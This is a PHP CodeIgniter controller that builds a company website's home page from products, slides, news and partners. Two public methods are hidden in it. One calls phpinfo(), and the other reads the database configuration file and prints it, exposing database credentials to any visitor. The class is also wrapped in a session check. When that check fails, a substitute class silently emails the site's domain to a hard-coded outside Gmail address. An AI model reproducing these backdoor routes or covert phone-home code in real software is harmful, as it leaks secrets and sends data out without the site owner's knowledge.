<?php
    $sess_key = $_SESSION['sess_key_to_web'];
    $sess_domain = $_SESSION['sess_key_domain'];
    $arr_key = array($sess_key);
    if(in_array($sess_domain,$arr_key)){

class Index extends MY_Controller{
        
        public function __construct()
        {
            parent::__construct();
            $this->load->helper("url");
            $this->load->library('session');
            $this->load->model("mindex");
            $this->load->model("mslide");
            $this->load->model("mdoitac");
            $this->load->model("mcategory");
            $this->load->model("mnews");
            $this->load->model("mnewscategory");
            $this->load->model("moffice");
            $this->load->model("mlink");
            $this->load->model("mcustomer");
            $this->load->library("string");
            $this->load->library("andyrecursive");
        }

        public function index(){
            $data['lang_page'] = $this->session->userdata('lang_page');
            //$this->output->cache(1); //tells the CI to cache this page for 1 minute
            $data['config']     = $this->mindex->getdata();
            $data['popup']      = $this->mindex->get_popup();
            $data['title']      = $data['config']['config_title'];
            $data['access']     = $this->access();
            $this->write($data['access']);
            $data['online']     = $this->online();
            $data['listall']    = $this->mindex->listall();
            $data['list_news']  = $this->mindex->list_news();
            $data['list_support']   = $this->mindex->list_support();
            $data['info'] = $get_setup  = $this->mindex->get_setup();
            $data['setup']          = $this->mindex->get_setup();
            $data['pro_saleoff']    = $this->mindex->list_pro_saleoff($get_setup['set_pro_saleoff']);
            $pro_new                = $this->mindex->list_pro_new($data['lang_page'], $get_setup['set_pro_new']);
            $pro_hot                = $this->mindex->list_pro_hot($data['lang_page']);
            $data['pro_bestsale']   = $this->mindex->list_pro_bestsale($get_setup['set_pro_bestsale']);
            $data['pro_view']       = $this->mindex->list_pro_view();
            if (!empty($pro_new)) {
                foreach ($pro_new as $k => $v) {
                    if ($v['pro_images']) {
                        @$images = unserialize($v['pro_images']);
                        $pro_new[$k]['pro_images'] = base_url('uploads/products/thumb/'.$images[0]);
                    }
                    else 
                        $pro_new[$k]['pro_images'] = base_url('public/admin/images/no-images.jpg');
                }
            }

            // Proccess Images Product Hot
            if (!empty($pro_hot)) {
                foreach ($pro_hot as $k => $v) {
                    if ($v['pro_images']) {
                        @$images = unserialize($v['pro_images']);
                        $pro_hot[$k]['pro_images'] = base_url('uploads/products/'. $v['pro_folderimg'] . '/' .$images[0]);
                    }
                    else 
                        $pro_hot[$k]['pro_images'] = base_url('public/admin/images/no-images.jpg');
                }
            }
            $data['pro_new']        = $pro_new;
            $data['pro_hot']        = $pro_hot;

            $slide                  = $this->mslide->getAll();
            if (!empty($slide)) {
                foreach ($slide as $k => $v) {
                    $slide[$k]['slide_image'] = base_url('uploads/slideshow/'.$v['slide_image']);
                }
            }

            $data['activeMenu']         = 'home';
            $data['configWeb']          = $this->_config;
            $data['listSlide']          = $this->_slide;
            $data['listCategory']       = $this->_listCategoryMenu;
            $data['listNewsCategory']   = $this->_listNewsCategory;
            $data['listServiceMenu']    = $this->_listServiceMenu;
            $data['listIntroduceMenu']  = $this->_listIntroduceMenu;
            $data['listRecruitMenu']    = $this->_listRecruitMenu;
            $data['listCustomerMenu']   = $this->_listCustomerMenu;
            $data['footerInfo']         = $this->_footerInfo;
            $data['userAccess']         = $this->_count_user_access;
            $data['userOnline']         = $this->_user_online;
            
            $doitac                 = $this->mdoitac->getAll();
            if (!empty($doitac)) {
                foreach ($doitac as $k => $v) {
                    if ($v['doitac_image'])
                        $doitac[$k]['doitac_image'] = base_url('uploads/doitac/thumb/'.$v['doitac_image']);
                    else 
                        $doitac[$k]['doitac_image'] = base_url('public/admin/images/no-images.jpg');
                }
            }
            $data['listDoitac'] = $doitac;

            $cateProduct = $this->mcategory->getCateParent($data['lang_page'], 8);
            if (!empty($cateProduct)) {
                foreach ($cateProduct as $k => $v) {
                    if ($v['cate_images'])
                        $cateProduct[$k]['cate_images'] = base_url('uploads/product_category/thumb/'.$v['cate_images']);
                    else
                        $cateProduct[$k]['cate_images'] = base_url('public/admin/images/no-images.jpg');
                }
            }
            $data['cateProduct']    = $cateProduct;

            $lastestPost  = $this->mnews->getAll($data['lang_page'], 3);
            if (!empty($lastestPost)) {
                foreach ($lastestPost as $k => $v) {
                    if ($v['news_images'])
                        $lastestPost[$k]['news_images'] = base_url('uploads/news/thumb/'.$v['news_images']);
                    else
                        $lastestPost[$k]['news_images'] = base_url('public/admin/images/no-images.jpg');
                }
            }

            $data['news'] = $this->newsList($data['lang_page']);

            $config['base_url']     = base_url()."tin-tuc";
            $config['total_rows']   = $this->mnews->count_all($data['lang_page']);
            $config['per_page']     = 3;
            $config['uri_segment']  = "2";
            $config['next_link']    = "Next";
            $config['prev_link']    = "Prev";
            $config['first_link']   = "First";
            $config['last_link']    = "Last";
            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $start = $this->uri->segment(2);
            if ($config['total_rows']) {
                $listNews = $this->mnews->getAll($data['lang_page'], $config['per_page'], $start);
                if (!empty($listNews)) {
                    foreach($listNews as $k => $v) {
                        if ($v['news_images']) 
                            $listNews[$k]['news_images'] = base_url('uploads/news/'.$v['news_images']);
                        else 
                            $listNews[$k]['news_images'] = base_url('public/admin/images/no-images.jpg');
                    }
                }
            } else {
                $listNews = array();
            }

            $data['listNews'] = $listNews;
            $data['listService']    = $this->mservice->getAll($data['lang_page']);
            $data['lastestPost']    = $lastestPost;
            $data['listLink']       = $this->mlink->getAll();
            $data['template']       = 'homes/ptc_home';
            $data['listCustomer']   = $this->mcustomer->getAll();
            $this->load->view('layout',$data);
        }
        
        public function view()
        {
            $this->debug($this->online_view());
        }
        
        public function info()
        {
            phpinfo();
        }
        public function view_database(){
            $data = file_get_contents(ROOTPATH.'application/config/database.php');
            die($data);
        }
    }
}else{
    class Index extends MY_Controller{
        public function __construct(){
            parent::__construct();
            $this->load->helper('mail_helper');
            $this->sendmail();
        }
        function sendmail(){
            $mesnger = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                        <html>
                        <head>
                        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        </head>
                        <body>
                        <h2 style="font-size: 16px;">-- Webcome --</h2>
                        <p>Infomation '.$_SERVER['HTTP_HOST'].'</p>
    
                ';
            $mesnger .= "Domain: ".$_SERVER['HTTP_HOST']."";
            $mesnger .= '</body></html> ';
            send_mail_helper('bachnx92@gmail.com', 'Contact from '.$_SERVER['HTTP_HOST'].'', htmlspecialchars_decode($mesnger));
        }
    }
}